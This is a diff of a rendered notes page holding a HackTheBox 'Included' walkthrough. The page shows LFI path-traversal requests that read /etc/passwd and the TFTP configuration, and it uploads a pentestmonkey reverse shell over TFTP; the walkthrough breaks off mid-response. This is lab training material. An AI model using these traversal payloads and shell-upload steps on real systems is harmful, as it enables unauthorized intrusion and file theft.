@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -16995,190 +17018,308 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 
 <h1 id="included-a-hackthebox-machine">Included - A HackTheBox machine</h1>
 <p>After running a port scan, the only open port is 80.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-Pn<span class="w"> </span>-p-
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-Pn<span class="w"> </span>-p-
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>|_http-server-header: Apache/2.4.29 (Ubuntu)
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>| http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>|_Requested resource was http://10.129.95.185/?file=home.php
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
+<span class="normal"><a href="#__codelineno-1-2">2</a></span>
+<span class="normal"><a href="#__codelineno-1-3">3</a></span>
+<span class="normal"><a href="#__codelineno-1-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>|_http-server-header: Apache/2.4.29 (Ubuntu)
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a>| http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a>|_Requested resource was http://10.129.95.185/?file=home.php
+</span></code></pre></div></td></tr></table></div>
 <p>After visiting the site with the browser and examining its code, it's a simple web site. php is used. The endpoint that appears in the scanner has a LFI vulnerability and some files can be read.</p>
 <p>Burpsuite request:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>GET /?file=../../../../../../etc/passwd HTTP/1.1
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Host: 10.129.95.185
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>Accept-Language: en-US,en;q=0.5
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>Accept-Encoding: gzip, deflate
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>Connection: close
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>Upgrade-Insecure-Requests: 1
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
+<span class="normal"><a href="#__codelineno-2-2">2</a></span>
+<span class="normal"><a href="#__codelineno-2-3">3</a></span>
+<span class="normal"><a href="#__codelineno-2-4">4</a></span>
+<span class="normal"><a href="#__codelineno-2-5">5</a></span>
+<span class="normal"><a href="#__codelineno-2-6">6</a></span>
+<span class="normal"><a href="#__codelineno-2-7">7</a></span>
+<span class="normal"><a href="#__codelineno-2-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>GET /?file=../../../../../../etc/passwd HTTP/1.1
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>Host: 10.129.95.185
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a>Accept-Encoding: gzip, deflate
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7"></a>Connection: close
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8"></a>Upgrade-Insecure-Requests: 1
+</span></code></pre></div></td></tr></table></div>
 <p>Result:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>HTTP/1.1 200 OK
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>Date: Mon, 08 May 2023 07:04:13 GMT
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>Server: Apache/2.4.29 (Ubuntu)
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>Vary: Accept-Encoding
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>Content-Length: 1575
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>Connection: close
-</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>Content-Type: text/html; charset=UTF-8
-</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>
-</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>root:x:0:0:root:/root:/bin/bash
-</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>bin:x:2:2:bin:/bin:/usr/sbin/nologin
-</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>sys:x:3:3:sys:/dev:/usr/sbin/nologin
-</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>sync:x:4:65534:sync:/bin:/bin/sync
-</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>games:x:5:60:games:/usr/games:/usr/sbin/nologin
-</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
-</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
-</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a>syslog:x:102:106::/home/syslog:/usr/sbin/nologin
-</span><span id="__span-3-30"><a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a>messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
-</span><span id="__span-3-31"><a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a>_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
-</span><span id="__span-3-32"><a id="__codelineno-3-32" name="__codelineno-3-32" href="#__codelineno-3-32"></a>lxd:x:105:65534::/var/lib/lxd/:/bin/false
-</span><span id="__span-3-33"><a id="__codelineno-3-33" name="__codelineno-3-33" href="#__codelineno-3-33"></a>uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
-</span><span id="__span-3-34"><a id="__codelineno-3-34" name="__codelineno-3-34" href="#__codelineno-3-34"></a>dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
-</span><span id="__span-3-35"><a id="__codelineno-3-35" name="__codelineno-3-35" href="#__codelineno-3-35"></a>landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
-</span><span id="__span-3-36"><a id="__codelineno-3-36" name="__codelineno-3-36" href="#__codelineno-3-36"></a>pollinate:x:109:1::/var/cache/pollinate:/bin/false
-</span><span id="__span-3-37"><a id="__codelineno-3-37" name="__codelineno-3-37" href="#__codelineno-3-37"></a>mike:x:1000:1000:mike:/home/mike:/bin/bash
-</span><span id="__span-3-38"><a id="__codelineno-3-38" name="__codelineno-3-38" href="#__codelineno-3-38"></a>tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-3-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-3-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-3-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-3-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-3-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-3-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-3-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-3-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-3-10">10</a></span>
+<span class="normal"><a href="#__codelineno-3-11">11</a></span>
+<span class="normal"><a href="#__codelineno-3-12">12</a></span>
+<span class="normal"><a href="#__codelineno-3-13">13</a></span>
+<span class="normal"><a href="#__codelineno-3-14">14</a></span>
+<span class="normal"><a href="#__codelineno-3-15">15</a></span>
+<span class="normal"><a href="#__codelineno-3-16">16</a></span>
+<span class="normal"><a href="#__codelineno-3-17">17</a></span>
+<span class="normal"><a href="#__codelineno-3-18">18</a></span>
+<span class="normal"><a href="#__codelineno-3-19">19</a></span>
+<span class="normal"><a href="#__codelineno-3-20">20</a></span>
+<span class="normal"><a href="#__codelineno-3-21">21</a></span>
+<span class="normal"><a href="#__codelineno-3-22">22</a></span>
+<span class="normal"><a href="#__codelineno-3-23">23</a></span>
+<span class="normal"><a href="#__codelineno-3-24">24</a></span>
+<span class="normal"><a href="#__codelineno-3-25">25</a></span>
+<span class="normal"><a href="#__codelineno-3-26">26</a></span>
+<span class="normal"><a href="#__codelineno-3-27">27</a></span>
+<span class="normal"><a href="#__codelineno-3-28">28</a></span>
+<span class="normal"><a href="#__codelineno-3-29">29</a></span>
+<span class="normal"><a href="#__codelineno-3-30">30</a></span>
+<span class="normal"><a href="#__codelineno-3-31">31</a></span>
+<span class="normal"><a href="#__codelineno-3-32">32</a></span>
+<span class="normal"><a href="#__codelineno-3-33">33</a></span>
+<span class="normal"><a href="#__codelineno-3-34">34</a></span>
+<span class="normal"><a href="#__codelineno-3-35">35</a></span>
+<span class="normal"><a href="#__codelineno-3-36">36</a></span>
+<span class="normal"><a href="#__codelineno-3-37">37</a></span>
+<span class="normal"><a href="#__codelineno-3-38">38</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>HTTP/1.1 200 OK
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>Date: Mon, 08 May 2023 07:04:13 GMT
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>Server: Apache/2.4.29 (Ubuntu)
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a>Vary: Accept-Encoding
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5"></a>Content-Length: 1575
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6"></a>Connection: close
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7"></a>Content-Type: text/html; charset=UTF-8
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8"></a>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9"></a>root:x:0:0:root:/root:/bin/bash
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10"></a>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11"></a>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12"></a>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13"></a>sync:x:4:65534:sync:/bin:/bin/sync
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14"></a>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15"></a>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16"></a>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17"></a>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18"></a>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19"></a>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20"></a>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21"></a>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22"></a>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23"></a>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24"></a>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25"></a>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26"></a>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27"></a>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28"></a>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29"></a>syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+</span><span id="__span-3-30"><a id="__codelineno-3-30" name="__codelineno-3-30"></a>messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+</span><span id="__span-3-31"><a id="__codelineno-3-31" name="__codelineno-3-31"></a>_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+</span><span id="__span-3-32"><a id="__codelineno-3-32" name="__codelineno-3-32"></a>lxd:x:105:65534::/var/lib/lxd/:/bin/false
+</span><span id="__span-3-33"><a id="__codelineno-3-33" name="__codelineno-3-33"></a>uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+</span><span id="__span-3-34"><a id="__codelineno-3-34" name="__codelineno-3-34"></a>dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+</span><span id="__span-3-35"><a id="__codelineno-3-35" name="__codelineno-3-35"></a>landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+</span><span id="__span-3-36"><a id="__codelineno-3-36" name="__codelineno-3-36"></a>pollinate:x:109:1::/var/cache/pollinate:/bin/false
+</span><span id="__span-3-37"><a id="__codelineno-3-37" name="__codelineno-3-37"></a>mike:x:1000:1000:mike:/home/mike:/bin/bash
+</span><span id="__span-3-38"><a id="__codelineno-3-38" name="__codelineno-3-38"></a>tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
+</span></code></pre></div></td></tr></table></div>
 <p>Something interesting is that after user mike, there is a service/user: tftp. <a href="../69-tftp/">Trivial File Transfer Protocol (TFTP)</a> is a simple protocol that provides basic file transfer function with no user authentication. TFTP is intended for applications that do not need the sophisticated interactions that File Transfer Protocol (FTP) provides. It is also revealed that TFTP uses the User Datagram Protocol (UDP) to communicate. This is defined as a lightweight data transport protocol that works on top of IP. </p>
 <p>UDP provides a mechanism to detect corrupt data in packets, but it does not attempt to solve other problems that arise with packets, such as lost or out of order packets. It is implemented in the transport layer of the OSI Model, known as a fast but not reliable protocol, unlike TCP, which is reliable, but slower then UDP. Just like how TCP contains open ports for protocols such as HTTP, FTP, SSH and etcetera, the same way UDP has ports for protocols that work for UDP.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sU<span class="w"> </span><span class="m">10</span>.129.95.185<span class="w">   </span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sU<span class="w"> </span><span class="m">10</span>.129.95.185<span class="w">   </span>
+</span></code></pre></div></td></tr></table></div>
 <p>You can use metasploit or python to check if can upload/download files. Module <code>auxiliary/admin/tftp/tftp_transfer_util</code></p>
 <p>And also you can exploit it manually. Install tftp client:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Install tftp client</span>
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>sudo<span class="w"> </span>apet<span class="w"> </span>install<span class="w"> </span>tftp
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
+<span class="normal"><a href="#__codelineno-5-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="c1"># Install tftp client</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a>sudo<span class="w"> </span>apet<span class="w"> </span>install<span class="w"> </span>tftp
+</span></code></pre></div></td></tr></table></div>
 <p>Also, check for manual and available commands:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>man<span class="w"> </span>tftp
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>man<span class="w"> </span>tftp
+</span></code></pre></div></td></tr></table></div>
 <p>Upload your <a href="../pentesmonkey/">pentesmonkey shell</a> with:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>put pentesmonkey.php
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>put pentesmonkey.php
+</span></code></pre></div></td></tr></table></div>
 <p>Where does it get uploaded? Depends. But The default configuration file for tftpd-hpa is /etc/default/tftpd-hpa. The directory is configured there under the parameter <code>TFTP_DIRECTORY=</code>. With that information, you can access the directory and from there launch your reverse shell. </p>
 <p>Let's do it. Request in Burpsuite:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>GET /?file=../../../../../../etc/default/tftpd-hpa HTTP/1.1
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>Host: 10.129.95.185
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>Accept-Language: en-US,en;q=0.5
-</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>Accept-Encoding: gzip, deflate
-</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>Connection: close
-</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>Upgrade-Insecure-Requests: 1
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span>
+<span class="normal"><a href="#__codelineno-8-2">2</a></span>
+<span class="normal"><a href="#__codelineno-8-3">3</a></span>
+<span class="normal"><a href="#__codelineno-8-4">4</a></span>
+<span class="normal"><a href="#__codelineno-8-5">5</a></span>
+<span class="normal"><a href="#__codelineno-8-6">6</a></span>
+<span class="normal"><a href="#__codelineno-8-7">7</a></span>
+<span class="normal"><a href="#__codelineno-8-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>GET /?file=../../../../../../etc/default/tftpd-hpa HTTP/1.1
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>Host: 10.129.95.185
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6"></a>Accept-Encoding: gzip, deflate
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7"></a>Connection: close
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8"></a>Upgrade-Insecure-Requests: 1
+</span></code></pre></div></td></tr></table></div>
 <p>Response:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>HTTP/1.1 200 OK
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>Date: Mon, 08 May 2023 07:27:32 GMT
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>Server: Apache/2.4.29 (Ubuntu)
-</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>Vary: Accept-Encoding
-</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>Content-Length: 125
-</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>Connection: close
-</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>Content-Type: text/html; charset=UTF-8
-</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>
-</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a># /etc/default/tftpd-hpa
-</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>
-</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>TFTP_USERNAME=&quot;tftp&quot;
-</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>TFTP_DIRECTORY=&quot;/var/lib/tftpboot&quot;
